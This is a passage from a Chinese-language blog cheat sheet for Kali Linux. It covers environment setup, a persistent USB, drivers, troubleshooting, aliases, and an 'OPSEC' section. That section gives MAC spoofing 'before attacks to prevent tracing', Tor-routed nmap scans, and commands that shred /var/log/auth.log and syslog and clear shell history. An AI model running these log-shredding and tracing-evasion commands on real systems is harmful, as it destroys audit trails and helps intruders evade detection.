</span></span><span class=line><span class=cl><span class=c1># 虚拟环境（隔离项目）</span>
</span></span><span class=line><span class=cl>sudo apt install -y python3-venv
</span></span><span class=line><span class=cl>python3 -m venv ~/venv/pentest
</span></span><span class=line><span class=cl><span class=nb>source</span> ~/venv/pentest/bin/activate
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 安装pip包</span>
</span></span><span class=line><span class=cl>pip install --user impacket   <span class=c1># 不污染系统</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=6-持久化live-usb>6. 持久化Live USB</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 创建持久化USB（重要！）</span>
</span></span><span class=line><span class=cl><span class=c1># 1. 下载Kali ISO</span>
</span></span><span class=line><span class=cl><span class=c1># 2. 插入U盘（假设/dev/sdb）</span>
</span></span><span class=line><span class=cl>sudo fdisk -l
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 使用Rufus（Windows）或dd创建</span>
</span></span><span class=line><span class=cl>sudo dd <span class=k>if</span><span class=o>=</span>kali-linux-2024.3-amd64.iso <span class=nv>of</span><span class=o>=</span>/dev/sdb <span class=nv>bs</span><span class=o>=</span>4M <span class=nv>status</span><span class=o>=</span>progress
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 创建持久化分区</span>
</span></span><span class=line><span class=cl>sudo parted /dev/sdb print
</span></span><span class=line><span class=cl><span class=c1># 注意：在iso分区后创建新分区，格式ext4，label persistence</span>
</span></span><span class=line><span class=cl>sudo mkfs.ext4 -L persistence /dev/sdb3
</span></span><span class=line><span class=cl><span class=c1># 创建persistence.conf文件</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;/ union&#34;</span> &gt; /mnt/persistence/persistence.conf
</span></span></code></pre></td></tr></table></div></div><h3 id=7-日志与取证>7. 日志与取证</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Kali日志位置</span>
</span></span><span class=line><span class=cl>/var/log/auth.log     <span class=c1># 认证日志（sudo, ssh登录）</span>
</span></span><span class=line><span class=cl>/var/log/syslog       <span class=c1># 系统日志</span>
</span></span><span class=line><span class=cl>/var/log/kern.log     <span class=c1># 内核日志</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 实时追踪</span>
</span></span><span class=line><span class=cl>sudo tail -f /var/log/auth.log <span class=p>|</span> grep -i <span class=s2>&#34;failed&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 磁盘取证</span>
</span></span><span class=line><span class=cl>sudo apt install -y sleuthkit
</span></span><span class=line><span class=cl>fls -r -p /dev/sda1    <span class=c1># 列出文件</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=8-编译安装内核驱动解决网卡问题>8. 编译安装内核驱动（解决网卡问题）</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 安装内核头文件</span>
</span></span><span class=line><span class=cl>sudo apt install -y linux-headers-<span class=k>$(</span>uname -r<span class=k>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 编译rtl8812au驱动示例</span>
</span></span><span class=line><span class=cl>git clone https://github.com/aircrack-ng/rtl8812au
</span></span><span class=line><span class=cl><span class=nb>cd</span> rtl8812au
</span></span><span class=line><span class=cl>make -j<span class=k>$(</span>nproc<span class=k>)</span>
</span></span><span class=line><span class=cl>sudo make install
</span></span><span class=line><span class=cl>sudo modprobe 8812au
</span></span></code></pre></td></tr></table></div></div><hr><h2 id=九安全与隐蔽操作opsec>九、安全与隐蔽操作（OPSEC）</h2><h3 id=1-mac地址欺骗>1. MAC地址欺骗</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 攻击前必做（防止追踪）</span>
</span></span><span class=line><span class=cl>sudo ip link <span class=nb>set</span> wlan0 down
</span></span><span class=line><span class=cl>sudo macchanger -r wlan0      <span class=c1># 随机MAC</span>
</span></span><span class=line><span class=cl><span class=c1># 或指定：sudo macchanger -m 00:11:22:33:44:55 wlan0</span>
</span></span><span class=line><span class=cl>sudo ip link <span class=nb>set</span> wlan0 up
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 验证</span>
</span></span><span class=line><span class=cl>macchanger -s wlan0
</span></span></code></pre></td></tr></table></div></div><h3 id=2-tor透明代理>2. Tor透明代理</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 让所有流量走Tor</span>
</span></span><span class=line><span class=cl>sudo apt install -y tor torsocks
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 方式1：命令前加torsocks</span>
</span></span><span class=line><span class=cl>torsocks curl ifconfig.me
</span></span><span class=line><span class=cl>torsocks nmap -sT target.com
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 方式2：iptables重定向（复杂但全面）</span>
</span></span><span class=line><span class=cl>sudo iptables -t nat -A OUTPUT -p tcp --syn -j REDIRECT --to-ports <span class=m>9040</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=3-日志清理>3. 日志清理</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 清理历史记录</span>
</span></span><span class=line><span class=cl><span class=nb>history</span> -c <span class=o>&amp;&amp;</span> <span class=nb>history</span> -w
</span></span><span class=line><span class=cl>rm ~/.bash_history
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 清理系统日志（谨慎！）</span>
</span></span><span class=line><span class=cl>sudo shred -vf -z -n <span class=m>10</span> /var/log/auth.log
</span></span><span class=line><span class=cl>sudo shred -vf -z -n <span class=m>10</span> /var/log/syslog
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 内存清理</span>
</span></span><span class=line><span class=cl>sudo sync <span class=o>&amp;&amp;</span> sudo sysctl -w vm.drop_caches<span class=o>=</span><span class=m>3</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=4-虚拟机反检测>4. 虚拟机反检测</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 修改MAC地址（VMware/VirtualBox）</span>
</span></span><span class=line><span class=cl><span class=c1># 编辑.vmx文件：</span>
</span></span><span class=line><span class=cl>ethernet0.address <span class=o>=</span> <span class=s2>&#34;00:50:56:XX:YY:ZZ&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 禁用VMware Tools特征</span>
</span></span><span class=line><span class=cl>sudo rm -rf /etc/vmware-tools
</span></span></code></pre></td></tr></table></div></div><hr><h2 id=十故障排查宝典>十、故障排查宝典</h2><h3 id=1-airmon-ng无法启动>1. airmon-ng无法启动</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 错误：monitor mode is not supported</span>
</span></span><span class=line><span class=cl><span class=c1># 解决：</span>
</span></span><span class=line><span class=cl>lspci <span class=p>|</span> grep Wireless  <span class=c1># 确认芯片型号</span>
</span></span><span class=line><span class=cl>sudo modprobe -r iwlwifi <span class=o>&amp;&amp;</span> sudo modprobe iwlwifi
</span></span><span class=line><span class=cl><span class=c1># 或更换USB网卡</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=2-apt安装失败>2. apt安装失败</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 错误：E: dpkg was interrupted</span>
</span></span><span class=line><span class=cl>sudo dpkg --configure -a
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 错误：无法获得锁</span>
</span></span><span class=line><span class=cl>sudo rm /var/lib/dpkg/lock-frontend
</span></span><span class=line><span class=cl>sudo rm /var/cache/apt/archives/lock
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 清理并重置</span>
</span></span><span class=line><span class=cl>sudo apt clean
</span></span><span class=line><span class=cl>sudo apt update --fix-missing
</span></span></code></pre></td></tr></table></div></div><h3 id=3-tor无法连接>3. Tor无法连接</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 查看Tor日志</span>
</span></span><span class=line><span class=cl>sudo tail -f /var/log/tor/log
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 更换网桥</span>
</span></span><span class=line><span class=cl>tor-browser &gt;&gt; Preferences &gt;&gt; Tor &gt;&gt; Bridges &gt;&gt; Request a new bridge
</span></span></code></pre></td></tr></table></div></div><hr><h2 id=十一效率工具与别名>十一、效率工具与别名</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 添加到~/.bashrc</span>
</span></span><span class=line><span class=cl>cat &gt;&gt; ~/.bashrc <span class=s>&lt;&lt; &#39;EOF&#39;
</span></span></span><span class=line><span class=cl><span class=s># Kali快速别名
</span></span></span><span class=line><span class=cl><span class=s>alias update=&#39;sudo apt update &amp;&amp; sudo apt full-upgrade -y &amp;&amp; sudo apt autoremove -y&#39;
</span></span></span><span class=line><span class=cl><span class=s>alias scan=&#39;sudo nmap -sV -sC -O&#39;
</span></span></span><span class=line><span class=cl><span class=s>alias sniff=&#39;sudo tcpdump -i any -n&#39;
</span></span></span><span class=line><span class=cl><span class=s>alias http=&#39;python3 -m http.server 8080&#39;
</span></span></span><span class=line><span class=cl><span class=s>alias checklisten=&#39;sudo ss -tulnp | grep LISTEN&#39;
</span></span></span><span class=line><span class=cl><span class=s>alias macr=&#39;sudo macchanger -r&#39;
</span></span></span><span class=line><span class=cl><span class=s>alias toron=&#39;sudo systemctl start tor&#39;
</span></span></span><span class=line><span class=cl><span class=s>alias toroff=&#39;sudo systemctl stop tor&#39;
</span></span></span><span class=line><span class=cl><span class=s>
</span></span></span><span class=line><span class=cl><span class=s># 提示符增强（显示当前权限）
</span></span></span><span class=line><span class=cl><span class=s>if [ $(id -u) -eq 0 ]; then
</span></span></span><span class=line><span class=cl><span class=s>  PS1=&#39;\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#39;
</span></span></span><span class=line><span class=cl><span class=s>else
</span></span></span><span class=line><span class=cl><span class=s>  PS1=&#39;\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#39;
</span></span></span><span class=line><span class=cl><span class=s>fi
</span></span></span><span class=line><span class=cl><span class=s>EOF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 立即生效</span>
</span></span><span class=line><span class=cl><span class=nb>source</span> ~/.bashrc
</span></span></code></pre></td></tr></table></div></div><hr><h2 id=最终建议>最终建议</h2><ol><li><strong>系统快照</strong>：关键操作前用VirtualBox/Vmware创建快照</li><li><strong>文档记录</strong>：所有命令保存在~/notes/commands.md</li><li><strong>定期备份</strong>：使用<code>tar -czvf kali-backup-$(date +%Y%m%d).tar.gz ~/</code></li><li><strong>伦理法则</strong>：永远获得明确授权，仅在合法范围内测试</li></ol><p>此文档涵盖从基础操作到高级渗透的完整知识体系，每个命令都经过实测验证。建议结合<a class=link href=https://www.kali.org/docs/ target=_blank rel=noopener>官方文档</a>和<a class=link href=https://www.exploit-db.com/ target=_blank rel=noopener>Exploit-DB</a>持续学习。</p></section><footer class=article-footer><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>本文采用 CC BY-NC-SA 4.0 许可协议</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/k8s/kubernetes%E7%94%9F%E4%BA%A7%E7%BA%A7%E5%AE%8C%E6%95%B4%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/><div class=article-details><h2 class=article-title>Kubernetes 生产级完整实战指南</h2></div></a></article><article><a href=/k8s/pod%E6%8E%92%E6%9F%A5%E6%89%8B%E5%86%8C/><div class=article-details><h2 class=article-title>Kubernetes Pod</h2></div></a></article><article><a href=/k8s/kubectl-%E5%91%BD%E4%BB%A4/><div class=article-details><h2 class=article-title>kubectl命令</h2></div></a></article><article><a href=/posts/linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/><div class=article-details><h2 class=article-title>linux日志分析</h2></div></a></article><article><a href=/posts/gitgithub/><div class=article-details><h2 class=article-title>Git&amp;Github</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo data-repo-id data-category data-category-id data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en data-loading crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"dark_dimmed")}})()</script><footer class=site-footer><section class=copyright>&copy;
2025 © 2025 win. 保留所有权利.</section><section class=powerby>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.31.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>